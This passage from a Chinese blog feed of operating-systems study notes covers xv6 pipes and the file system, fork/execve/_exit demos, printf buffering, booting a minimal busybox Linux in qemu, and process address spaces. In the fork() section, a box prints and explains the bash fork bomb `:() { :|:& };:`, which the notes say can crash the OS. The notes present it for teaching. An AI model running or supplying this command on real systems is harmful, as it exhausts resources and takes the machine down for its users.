class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入 <code>runcmd()</code> 的是执行当前命令的 shell 进程的子进程。该子进程在创建管道之后又创建了两个子进程，一个子进程将标准输出重定向到管道的输出端，并执行 “|” 左边的命令；另一个子进程将标准输入重定向到管道的输入端，并执行 “|” 右边的指令（注：这两个子进程互不影响）。考虑到命令可能会有多级管道（如 <code>a | b | c</code> 的形式），进程之间会形成一个树形结构，树的叶子节点在真正地执行指令，其他节点都在负责创建管道和子进程。</p>
<p>该代码有几个值得注意的细节：</p>
<ul>
<li><p><strong>通过管道读取的 <code>read()</code> 系统调用在没有数据输入的时候会被阻塞，直到新的数据到来或者和管道输出端相连的所有文件描述符均被关闭</strong>（在管道输出端已经没有打开的文件描述符时，<code>read()</code> 会返回 0）。因此父进程必须在两个 if 块后面将和管道输出绑定的 p[1] 关闭，第二个 if 块克隆的用于输入的子进程也必须将和管道输出绑定的 p[1] 关闭，否则 <code>read()</code> 将陷入死循环。下面的例子展示了忽略某些管道输出的关闭会造成死循环的后果：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">pipe(p);</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    dup(p[<span class="number">0</span>]);      <span class="comment">// 将标准输入重定向到管道输入</span></span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);    <span class="comment">// ***</span></span><br><span class="line">    <span class="keyword">int</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">while</span> (n = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf)) &gt; <span class="number">0</span>) write(<span class="number">1</span>, buf, n);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    dup(p[<span class="number">1</span>]);       <span class="comment">// 将标准输出重定向到管道输出</span></span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello\n&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(p[<span class="number">0</span>]);</span><br><span class="line">close(p[<span class="number">1</span>]);         <span class="comment">// ***</span></span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">wait(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>  标有 <code>***</code> 的两处管道输出关闭，去掉任何一个都会导致第一个子进程中的 <code>read()</code> 系统调用无法正确识别输入的结束，陷入死循环。</p>
</li>
<li><p>每使用一次 <code>wait()</code> 系统调用，父进程都会等待直到某一个子进程终止。该程序中父进程 fork 了两个子进程，因此需要连续执行两次 <code>wait()</code> 系统调用。</p>
</li>
</ul>
<h2 id="1-4-File-systems"><a href="#1-4-File-systems" class="headerlink" title="1.4 File systems"></a>1.4 File systems</h2><p>以 <code>/</code> 开头的路径是绝对路径，否则是相对路径。相对路径会在当前工作目录下寻找文件。<code>chdir()</code> 系统调用可以修改当前的工作目录。下面的例子中，两种操作做的事情等价：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">&quot;/a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">open(<span class="string">&quot;c&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">open(<span class="string">&quot;/a/b/c&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure>

<p><code>cd</code> 命令是一个特殊的命令，它的作用是切换当前的工作目录，其特殊之处在于我们不能 fork 一个子进程并执行这个程序，否则只有子进程的工作目录被修改，子进程退出之后父进程的工作目录没有变。<code>cd</code> 命令直接在原进程中使用。</p>
<p>创建文件和文件夹的系统调用有 <code>open()</code> <code>mkdir()</code> <code>mknod()</code> 等。<code>open()</code> 的第二个参数中或上 O_CREATE 可以在文件不存在时创建它；<code>mkdir()</code> 用于创建文件夹；<code>mknod()</code> 可以创建一个设备文件。</p>
<hr>
<p>文件名和其对应的文件是两个概念。每个文件有一个唯一的文件索引号 (inode)，文件可以有若干个文件名，这些文件名都指向该文件的 inode。使用 <code>fstat()</code> 系统调用可以查看一个文件的 inode 信息。<code>fstat()</code> 的声明为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat* stat)</span></span>;</span><br></pre></td></tr></table></figure>

<p>stat 结构体的格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DIR		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_FILE		2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DEVICE	3</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> dev;        <span class="comment">// 文件系统的磁盘设备</span></span><br><span class="line">    uint ino;       <span class="comment">// inode号</span></span><br><span class="line">    <span class="keyword">short</span> type;     <span class="comment">// 文件类型，上方三个宏中的一个</span></span><br><span class="line">    <span class="keyword">short</span> nlink;    <span class="comment">// 指向该inode的文件名的个数</span></span><br><span class="line">    uint64 size;    <span class="comment">// 文件大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>link()</code> 系统调用可以将一个新的文件名指向某一个老的文件名指向的 inode，<code>unlink()</code> 系统调用可以将文件名和 inode 的关联删除。例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">link(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>第一条语句过后，使用文件名 “a” 和 “b” 将访问到同一个文件。第二条语句过后，只能使用文件名 “b” 访问该文件</p>
<h2 id="1-5-Real-world"><a href="#1-5-Real-world" class="headerlink" title="1.5 Real world"></a>1.5 Real world</h2><p>略。</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 11: Processes in Operating Systems</title>
    <url>/2022/03/25/NJU-OS%20Lecture%2011%20-%20Processes%20in%20Operating%20Systems/</url>
    <content><![CDATA[<p>在 <code>thread-os.c</code> 中，操作系统启动后会初始化若干个线程 (的状态机)，或者说加载若干个程序。真正的操作系统启动后会创建第一个进程。如果查看 Linux 的源码，我们可以看到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">	    !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">	    !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">	    !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">panic(<span class="string">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class="line">	      <span class="string">&quot;See Linux Documentation/admin-guide/init.rst for guidance.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>内核会按照一个特定的顺序加载“第一个程序”，如果都无法加载，Linux kernel 会直接拒绝启动。</p>
<span id="more"></span>

<h2 id="A-Minimal-Linux"><a href="#A-Minimal-Linux" class="headerlink" title="A Minimal Linux"></a>A Minimal Linux</h2><p>我们可以在 qemu 上调试 vmlinuz 内核。如下命令会启动一个没有图形界面，128M 内存的 linux 内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">	  -nographic \</span><br><span class="line">	  -serial mon:stdio \</span><br><span class="line">	  -m 128 \</span><br><span class="line">	  -kernel vmlinuz \</span><br><span class="line">	  -initrd build/initramfs.cpio.gz \</span><br><span class="line">	  -append <span class="string">&quot;console=ttyS0 quiet acpi=off&quot;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>initramfs.cpio.gz</code> 是内核启动时存放在内存中的一个很小的文件系统的镜像，它打包了如下目录结构中地 initramfs 中的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├── initramfs</span><br><span class="line">│   ├── bin</span><br><span class="line">│   │   └── busybox</span><br><span class="line">│   └── init</span><br><span class="line">├── Makefile</span><br><span class="line">└── vmlinuz</span><br></pre></td></tr></table></figure>

<p>启动内核后我们会得到一个 shell，当前的环境很简陋，但我们仍然可以用 <code>/bin/busybox 命令</code> 的方式使用一些 busybox 内置的命令，比如 ls 和 cat。</p>
<p>操作系统启动的第一个进程是 init。init 是一个脚本，有一行命令：<code>/bin/busybox sh</code>，它启动一个 shell。我们可以试试将 <code>/bin/busybox sh</code> 换成 <code>/bin/busybox echo hello</code>：可以看到操作系统确实打印了 hello，但随即报了 kernel panic。这是因为初始进程 init 返回了。</p>
<p>尽管现在的环境很简陋，但我们执行一些简单的代码就可以获得丰富的体验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c1=<span class="string">&quot;arch ash base64 cat chattr chgrp chmod chown conspy cp cpio cttyhack date dd df dmesg dnsdomainname dumpkmap echo ed egrep false fatattr fdflush fgrep fsync getopt grep gunzip gzip hostname hush ionice iostat ipcalc kbd_mode kill link linux32 linux64 ln login ls lsattr lzop makemime mkdir mknod mktemp more mount mountpoint mpstat mt mv netstat nice nuke pidof ping ping6 pipe_progress printenv ps pwd reformime resume rev rm rmdir rpm run-parts scriptreplay sed setarch setpriv setserial sh sleep stat stty su sync tar touch true umount uname usleep vi watch zcat&quot;</span></span><br><span class="line">c2=<span class="string">&quot;[ [[ awk basename bc beep blkdiscard bunzip2 bzcat bzip2 cal chpst chrt chvt cksum clear cmp comm crontab cryptpw cut dc deallocvt diff dirname dos2unix dpkg dpkg-deb du dumpleases eject env envdir envuidgid expand expr factor fallocate fgconsole find flock fold free ftpget ftpput fuser groups hd head hexdump hexedit hostid id install ipcrm ipcs killall last less logger logname lpq lpr lsof lspci lsscsi lsusb lzcat lzma man md5sum mesg microcom mkfifo mkpasswd nc nl nmeter nohup nproc nsenter nslookup od openvt passwd paste patch pgrep pkill pmap printf pscan&quot;</span></span><br><span class="line">c3=<span class="string">&quot;pstree pwdx readlink realpath renice reset resize rpm2cpio runsv runsvdir rx script seq setfattr setkeycodes setsid setuidgid sha1sum sha256sum sha3sum sha512sum showkey shred shuf smemcap softlimit sort split ssl_client strings sum sv svc svok tac tail taskset tcpsvd tee telnet test tftp time timeout top tr traceroute traceroute6 truncate ts tty ttysize udhcpc6 udpsvd unexpand uniq unix2dos unlink unlzma unshare unxz unzip uptime users uudecode uuencode vlock volname w wall wc wget which who whoami whois xargs xxd xz xzcat yes&quot;</span></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> <span class="variable">$c1</span> <span class="variable">$c2</span> <span class="variable">$c3</span>; <span class="keyword">do</span></span><br><span class="line">  /bin/busybox ln -s /bin/busybox /bin/<span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">mkdir -p /proc &amp;&amp; mount -t proc  none /proc</span><br><span class="line">mkdir -p /sys  &amp;&amp; mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">export</span> PS1=<span class="string">&#x27;(linux) &#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在我们可以直接使用命令不再需要加 /bin/busybox 的前缀 (得益于代码中的软链接)，我们还挂载了 procfs 和 sysfs。可以使用 ps 等命令查看进程。此外，我们可以运行任何放入到文件系统中的程序：例如之前的示例代码 <code>minimal.S</code> 和 <code>logisim.c</code>，只要是静态链接得到的可执行文件都可以在我们的 minimal Linux 中直接运行。</p>
<p>这一切说明操作系统没有什么神秘的：<strong>内核创建了第一个进程 init，然后这个进程通过各种各样的系统调用就能创造全世界。</strong>完成一切以后操作系统将退到幕后成为一个“中断处理程序”。此外，操作系统为应用程序提供各类 API，让应用程序创建/管理进程，地址空间，文件系统等。</p>
<h2 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h2><p>fork() 的含义非常简单：它会将当前进程的状态机完全复制一遍，作为当前进程的子进程。这两个进程几乎完全一样：相同的地址空间，相同的寄存器值…… (当然，进程号是不同的)，除了 fork() 的返回值在两个进程中不同：fork() 在父进程中返回子进程的进程号，在子进程中返回 0。</p>
<blockquote>
<p><strong>Fork Bomb</strong></p>
<p>状态机的复制也需要消耗一定的资源。如下的一段代码可以让 OS 崩溃：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:() &#123; :|:&amp; &#125;;:</span><br></pre></td></tr></table></figure>

<p>将其格式化后可以看出它的原理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:() &#123;</span><br><span class="line"> : | : &amp;</span><br><span class="line">&#125;; :</span><br></pre></td></tr></table></figure>

<p>bash 允许冒号作为标识符。: 这个函数的作用是用 fork 创建两个自己，用管道连接起来，然后放到后台执行。这样这个脚本就会像链式反应一样不断生成很多函数，直至系统资源耗尽。</p>
</blockquote>
<h3 id="Example-fork-demo-c"><a href="#Example-fork-demo-c" class="headerlink" title="Example: fork-demo.c"></a>Example: <code>fork-demo.c</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork-demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid1 = fork();</span><br><span class="line">  <span class="keyword">pid_t</span> pid2 = fork();</span><br><span class="line">  <span class="keyword">pid_t</span> pid3 = fork();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello World from (%d, %d, %d)\n&quot;</span>, pid1, pid2, pid3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行这段程序，我们可以看到所有的 8 种可能的结果：进程号是 0 / 真实值。我们可以画出状态机中的一条路径来理解这个输出 (即不考虑多个进程时程序的 non-deterministic 行为，总是挑选可以继续执行的进程号最小的进程走下一步)：</p>
<pre class="mermaid">flowchart
subgraph state1
    id0(*,*,* PC=1,pid=1)
end
state1 -. pid=1 .- state2
subgraph state2
    id1(2,*,* PC=2,pid=1) --> id2(0,*,* PC=2,pid=2)
end
state2 -. pid=1 .- state3
subgraph state3
    id3(2,3,* PC=3,pid=1) --> id4(0,*,* PC=2,pid=2)
    id3 --> id5(2,0,* PC=3, pid=3)
end
state3 -. pid=1 .- state4
subgraph state4
    id6(2,3,4 PC=4,pid=1) --> id7(0,*,* PC=2,pid=2)
    id6 --> id8(2,0,* PC=3,pid=3)
    id6 --> id9(2,3,0 PC=4,pid=4)
end
state4 -. pid=2 .- state5
subgraph state5
    id10(2,3,4 PC=4,pid=1) --> id11(0,5,* PC=3,pid=2) --> id14(0,0,* PC=3,pid=5)
    id10 --> id12(2,0,* PC=3,pid=3)
    id10 --> id13(2,3,0 PC=4,pid=4)
end
state5 -. pid=2 .- state6
subgraph state6
    id15(2,3,4 PC=4,pid=1) --> id18(0,5,6 PC=4,pid=2) --> id19(0,0,* PC=3,pid=5)
    id15 --> id16(2,0,* PC=3,pid=3)
    id15 --> id17(2,3,0 PC=4,pid=4)
    id18 --> id20(0,5,0 PC=4,pid=6)
end
state6 -. pid=3 .- state7
subgraph state7
    id21(2,3,4 PC=4,pid=1) --> id24(0,5,6 PC=4,pid=2) --> id25(0,0,* PC=3,pid=5)
    id21 --> id22(2,0,7 PC=4,pid=3) --> id27(2,0,0 PC=4,pid=7)
    id21 --> id23(2,3,0 PC=4,pid=4)
    id24 --> id26(0,5,0 PC=4,pid=6)
end
state7 -. pid=5 .- state8
subgraph state8
    id28(2,3,4 PC=4,pid=1) --> id32(0,5,6 PC=4,pid=2) --> id33(0,0,8 PC=4,pid=5) --> id35(0,0,0 PC=4,pid=8)
    id28 --> id29(2,0,7 PC=4,pid=3) --> id31(2,0,0 PC=4,pid=7)
    id28 --> id30(2,3,0 PC=4,pid=4)
    id32 --> id34(0,5,0 PC=4,pid=6)
end</pre>

<h3 id="Example-fork-printf-c"><a href="#Example-fork-printf-c" class="headerlink" title="Example: fork-printf.c"></a>Example: <code>fork-printf.c</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork-printf.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从抽象的状态机的角度分析，刚开始只有一个进程，第一轮一个进程变成两个进程，并分别打印 hello；第二轮两个进程变成 4 个进程，并分别打印 hello，最后应该总共有 6 个 hello。</p>
<p>运行该程序可以看到，终端上确实输出了 6 个 hello，但诡异的事情是：如果我们用管道或者重定向到文件的方式，都会得到 8 个 hello。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fork-printf | cat    <span class="comment"># 8个hello</span></span><br><span class="line">./fork-printf &gt; output <span class="comment"># 8个hello</span></span><br><span class="line">./fork-printf | wc -l  <span class="comment"># 8</span></span><br></pre></td></tr></table></figure>

<p>这件“诡异”的事情和 printf 的缓冲区有关。我们认为 printf 的语义是立即输出给定的字符串，但 printf 为了性能考虑 (尽可能少地与 io 交互)，会设置 buffer，将要输出的内容先预留在 buffer 中，待 buffer 满了 / 进程结束时再将 buffer 中的内容一并输出。</p>
<p>printf 根据标准输出指向的文件不同会使用不同的 buffer。当 stdout 是 tty 时，printf 使用 line buffer，即遇到换行符会清空一次 buffer，所以当我们输出到终端时看到的结果是 6 个；当 stdout 是管道或者文件时，printf 使用 full buffer，只有 buffer 满了才会清空。在这种情况下，第一轮的两个进程不会输出 hello，而是会将 hello 保存在 buffer 中，第二轮两个进程变 4 个进程时，fork() 复制状态机，当然也会复制 buffer 里的内容，因此新生成的两个进程的 buffer 里自带一个 hello，再执行 printf 后，每个进程的 buffer 里都有两个 hello。进程结束时内核清空 buffer，于是 4 个进程每个打印两个 hello，最终有 8 个 hello。</p>
<p>如果我们在程序开头加一句 <code>setbuf(stdout, NULL)</code>，指定 stdout 不使用 buffer，或者在 printf() 之后加 <code>ffush(stdout)</code> ，那么各种情况下我们都会得到 6 个 hello。</p>
<blockquote>
<p><strong>Tip: setbuf()</strong></p>
<p>setbuf() 函数可以指定向某个文件输出时使用的 buffer。与之相关的还有 setvbuf() （可以用 <code>_IONBF</code>  <code>_IOLBF</code> <code>_IOFBF</code> 制定无缓冲、行缓冲、全缓冲）等。</p>
<p>使用 setbuf() 时要小心的一点是我们注册的 buffer 不能在输出流被关闭之前被释放，例如下面的程序就是错误的 (undefined behavior)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>计算机系统里没有魔法。机器永远是对的。</strong></p>
<h2 id="execve"><a href="#execve" class="headerlink" title="execve()"></a>execve()</h2><p>execve() 的作用是重置一个状态机，运行 execve() 的参数中所写的程序。如果该系统调用执行成功，它不会返回，它后面的指令也不会被执行。结合运用 fork() 和 execve()，我们便可以创建新的状态机并运行新的程序。execve() 的声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> * <span class="keyword">const</span> argv, <span class="keyword">char</span> * <span class="keyword">const</span> envp)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中 filename 为想要加载的程序，argv 为传给新程序入口函数的参数，envp 为环境变量列表。下面是一个简单的示例程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// execve-demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> * <span class="keyword">const</span> argv[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">char</span> * <span class="keyword">const</span> envp[] = &#123;</span><br><span class="line">    <span class="string">&quot;HELLO=WORLD&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  execve(argv[<span class="number">0</span>], argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Should not reach here!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它使用 execve() 执行了命令 <code>/bin/bash -c env</code> 来打印环境变量。运行该程序，我们可以看到我们指定的环境变量 HELLO=WORLD 被打印，且 “should not reach here” 没有被打印。</p>
<p>系统中有很多有意思的环境变量。例如我们可以配置 <code>$AM_HOME</code> 来简写目录；bash 中的环境变量 PS1 决定了命令行提示符长什么样子；execvp()/gcc 等会根据 <code>$PATH</code> 中的目录一个一个去找有没有我们指定的程序 etc。我们可以 hack 这个行为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PATH= /bin/gcc program.c</span><br></pre></td></tr></table></figure>

<p>便会看到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc: fatal error: cannot execute ‘as’: execvp: No such file or directory</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>

<h2 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h2><p>exit() 用于销毁一个状态机。<code>_exit(int status)</code> 会销毁当前状态机，并允许有一个返回值。子进程被销毁了会通知父进程。这其中有一些值得思考的问题，例如如果这是一个多线程程序，exit() 应当销毁当前的线程还是当前的进程？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// exit-demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  atexit(func);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOFBF, <span class="number">1024</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Unflushed Buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;_exit&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;__exit&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exit-demo.c</code> 展示了各种不同的 exit 方法行为的不同，其中 atexit() 注册了一个在 exit() 的时候会调用的函数。各种运行方式的结果如下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>执行内容</th>
<th>系统调用</th>
<th>是否调用 atexit</th>
<th>输出内容</th>
</tr>
</thead>
<tbody><tr>
<td><code>./exit-demo</code></td>
<td><code>return EXIT_FAILURE</code></td>
<td>exit_group(1)</td>
<td>是</td>
<td>func &amp; buffer</td>
</tr>
<tr>
<td><code>./exit-demo exit</code></td>
<td><code>exit(0)</code></td>
<td>exit_group(0)</td>
<td>是</td>
<td>func &amp; buffer</td>
</tr>
<tr>
<td><code>./exit-demo _exit</code></td>
<td><code>_exit(0)</code></td>
<td>exit_group(0)</td>
<td>否</td>
<td>无</td>
</tr>
<tr>
<td><code>./exit-demo __exit</code></td>
<td><code>syscall(SYS_exit, 0)</code></td>
<td>exit(0)</td>
<td>否</td>
<td>无</td>
</tr>
</tbody></table>
<p>注：C 程序中的 exit(0) 是 <code>stdlib.h</code> 中的 libc 函数。</p>
<p>注：exit_group() 系统调用会终止当前进程的所有线程，而 exit() 系统调用只终止当前线程。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 12: Address Space of Process</title>
    <url>/2022/03/27/NJU-OS%20Lecture%2012%20-%20Address%20Space%20of%20Process/</url>
    <content><![CDATA[<h2 id="Address-Space"><a href="#Address-Space" class="headerlink" title="Address Space"></a>Address Space</h2><p>在 C 程序中，我们可以用指针访问任何可以访问的东西：比如 main() 函数的首地址，这个地址存储的内容就是 main() 的第一条指令。如果我们随便访问一个奇怪的地址，我们会得到段错误；如果我们往 main() 的首地址处写东西，我们也会得到段错误。</p>
<span id="more"></span>

<p>命令行工具 pmap 可以帮助我们观察一个进程的地址空间。我们以最小的程序 <code>minimal.S</code> 为例，在 GDB 中调试时可以用 <code>info inferiors</code> 查看进程号，并用 <code>pmap pid</code> 来查看地址空间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000000000400000      4K r---- a.out</span><br><span class="line">0000000000401000      4K r-x-- a.out</span><br><span class="line">00007ffff7ff9000     16K r----   [ anon ]</span><br><span class="line">00007ffff7ffd000      8K r-x--   [ anon ]</span><br><span class="line">00007ffffffde000    132K rw---   [ stack ]</span><br><span class="line">ffffffffff600000      4K --x--   [ anon ]</span><br><span class="line"> total              168K</span><br></pre></td></tr></table></figure>

<p>0x401000 之后的内容是代码段，这一段有可执行的权限。此外我们在栈上有环境变量，命令行参数等。</p>
<p>我们可以通过 <code>strace pmap pid</code> 来观察 pmap 是如何实现的。可以看到 pmap 使用了 openat() 系统调用来打开 procfs 中的 <code>/proc/pid/maps</code> 文件。查看这个文件，我们能看到比 pmap 更丰富的地址空间信息。</p>
